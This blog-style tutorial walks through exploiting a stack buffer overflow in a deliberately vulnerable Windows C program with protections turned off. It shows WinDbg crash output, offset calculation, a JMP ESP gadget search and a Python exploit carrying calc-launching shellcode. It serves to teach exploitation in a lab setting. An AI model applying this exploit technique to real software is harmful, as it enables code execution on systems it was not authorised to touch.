---
layout: post
title:  "How to detect and exploit a buffer overflow"
---

The buffer overflow is the most classical vulnerability, on Linux and on Windows.
In this article, I will try to show you how to exploit a buffer overflow on 
Windows with WinDbg and a little Python code.


## Etablishment

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char* argv[])
{
	char tmp[100];

	getchar()
	strcpy(tmp, argv[1]);
	printf("argv[1]: %s", tmp);

	return 0;
}
```

If you want to compile it with Visual Studio, don’t forget to deactivate some 
protections. Open *Project -> Properties* and set:

```
    Stack cookie: C/C++ -> Code generation -> Buffer Security Check = No
    ASLR: Linker -> Advanced -> Randomized Base Address = No
    DEP: Linker -> Advanced -> Data Execution Protection = No
``` 

And compile in *Release mode*.


## Exploitation

We will test `argv[1]` entry:

```py
import os 
os.system('bof.exe '+'A'*200);
``` 

We start our Python script, WinDbg and we do File -> Attach to a Process. 
We continue the script execution and we get:

```
(598.11cc): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
41414141 ??              ???
``` 

Boom! We could control EIP!
We check:

```
0:000:x86> r
eax=00000000 ebx=00000000 ecx=72e75617 edx=0008e3b8 esi=00000001 edi=00403378
eip=41414141 esp=0018ff4c ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246
```

*0x41* is 'A' in ASCII code, so we can control the execution address and execute 
our shellcode. We look at the stack to know how many 'A' we need to remove:

```
0:000:x86> dd esp
0018ff4c  41414141 41414141 41414141 41414141
0018ff5c  41414141 41414141 41414141 41414141
0018ff6c  41414141 41414141 41414141 41414141
0018ff7c  41414141 41414141 41414141 41414141
0018ff8c  41414141 41414141 41414141 41414141
0018ff9c  41414141 41414141 41414141 00000000
0018ffac  7efde000 00000000 00000000 00000000
0018ffbc  0018ffa0 00000000 ffffffff 775470d5
```

We change our Python script and we test once again:

```
0:000:x86> ? 0018ffac - 4 - 0018ff4c
Evaluate expression: 92 = 0000005c
```
```py
import os 
os.system('bof.exe '+'A'*104+'B'*4);
```

And execute it:

```
(e70.868): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
42424242 ??              ???
```

We need a 102 bytes padding, followed by the shellcode address and finally the
shellcode. But we have a problem: the shellcode will contain a null byte.
In fact, if we want to do that:

```py
import os 

padding = '\x90'*104 # NOP
eip = '\x4c\xff\x18\x00' # 0018ff4c

os.system('bof.exe '+ padding + eip);
```

We see that EIP wil contain a null byte and the shellcode will not work. So we 
will use the technique of JMP ESP.


## JMP ESP

We need to find a JMP ESP with *findjmp2*.
We dump the modules list:

```
ModLoad: 00000000`00400000 00000000`00405000   C:\Users\Dimitri\Desktop\bof.exe
ModLoad: 00000000`772f0000 00000000`7749c000   C:\Windows\SYSTEM32\ntdll.dll
ModLoad: 00000000`774d0000 00000000`77650000   ntdll.dll
ModLoad: 00000000`74fd0000 00000000`7500f000   C:\Windows\SYSTEM32\wow64.dll
ModLoad: 00000000`74f70000 00000000`74fcc000   C:\Windows\SYSTEM32\wow64win.dll
ModLoad: 00000000`74f60000 00000000`74f68000   C:\Windows\SYSTEM32\wow64cpu.dll
ModLoad: 00000000`75c10000 00000000`75d20000   KERNEL32.dll
ModLoad: 00000000`76080000 00000000`760c7000   KERNELBASE.dll
ModLoad: 00000000`73860000 00000000`7391f000   MSVCR100.dll
ModLoad: 00000000`10000000 00000000`1005a000   guard32.dll
ModLoad: 00000000`752d0000 00000000`753d0000   USER32.dll
ModLoad: 00000000`75570000 00000000`75600000   GDI32.dll
ModLoad: 00000000`75530000 00000000`7553a000   LPK.dll 
ModLoad: 00000000`75630000 00000000`756cd000   USP10.dll
ModLoad: 00000000`757c0000 00000000`7586c000   msvcrt.dll
ModLoad: 00000000`77030000 00000000`770d0000   ADVAPI32.dll
ModLoad: 00000000`752b0000 00000000`752c9000   SECHOST.dll
ModLoad: 00000000`756d0000 00000000`757c0000   RPCRT4.dll
ModLoad: 00000000`75030000 00000000`75090000   SspiCli.dll
ModLoad: 00000000`75020000 00000000`7502c000   CRYPTBASE.dll
ModLoad: 00000000`74f50000 00000000`74f59000   VERSION.dll
ModLoad: 00000000`76f10000 00000000`76f70000   IMM32.dll
ModLoad: 00000000`751e0000 00000000`752ac000   MSCTF.dll
ModLoad: 00000000`74ee0000 00000000`74ee7000   FLTLIB.DLL
```
```
C:\Users\Dimitri\Desktop>findjmp.exe KERNEL32.dll esp

Findjmp, Eeye, I2S-LaB
Findjmp2, Hat-Squad
Scanning KERNEL32.dll for code useable with the esp register
0x75C32EA9      push esp - ret
0x75C32EB1      push esp - ret
0x75C32EB9      push esp - ret
0x75C32EC1      push esp - ret
0x75C32EC9      push esp - ret
0x75C32ED1      push esp - ret
0x75C32ED9      push esp - ret
0x75C32EE1      push esp - ret
0x75C32EE9      push esp - ret
0x75C32EF1      push esp - ret
0x75C3EF93      call esp
0x75C40405      jmp esp
0x75C493A3      call esp
0x75C9D26F      call esp
Finished Scanning KERNEL32.dll for code useable with the esp register
Found 14 usable addresses
```

So we can choose a gadget and try:

```py
import os 

padding = '\x90'*104        # NOP
jmpESP = '\xA9\x2E\xC3\x75' # *75C32EA9 = jmp esp
shellcode = '\xCC'*4        # INT 3

os.system('bof.exe '+ padding + jmpESP + shellcode);
```

```
0:001> g
(1378.10f0): WOW64 breakpoint - code 4000001f (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
0018ff4c cc              int     3

0:000:x86> u
0018ff4c cc              int     3
0018ff4d cc              int     3
0018ff4e cc              int     3
0018ff4f cc              int     3
0018ff50 002d5000501b    add     byte ptr ds:[1B500050h],ch
0018ff56 50              push    eax
0018ff57 00bd1cf87000    add     byte ptr [ebp+70F81Ch],bh
0018ff5d 0000            add     byte ptr [eax],al
```

So we trigger the instruction `int 3`. Now we will try with a real shellcode to 
pop a calc:

```py
import os 

padding = '\x90'*104        # NOP
jmpESP = '\xA9\x2E\xC3\x75' # *75C32EA9 = jmp esp

# http://code.google.com/p/w32-exec-calc-shellcode/
shellcode =	("\x31\xD2\x52\x68\x63\x61\x6C\x63\x89\xE6\x52\x56\x64\x8B\x72\x30"
			"\x8B\x76\x0C\x8B\x76\x0C\xAD\x8B\x30\x8B\x7E\x18\x8B\x5F\x3C\x8B"
			"\x5C\x1F\x78\x8B\x74\x1F\x20\x01\xFE\x8B\x4C\x1F\x24\x01\xF9\x0F"
			"\xB7\x2C\x51\x42\xAD\x81\x3C\x07\x57\x69\x6E\x45\x75\xF1\x8B\x74"
			"\x1F\x1C\x01\xFE\x03\x3C\xAE\xFF\xD7\xCC");

os.system('bof.exe '+ padding + jmpESP +'"'+shellcode+'"');
```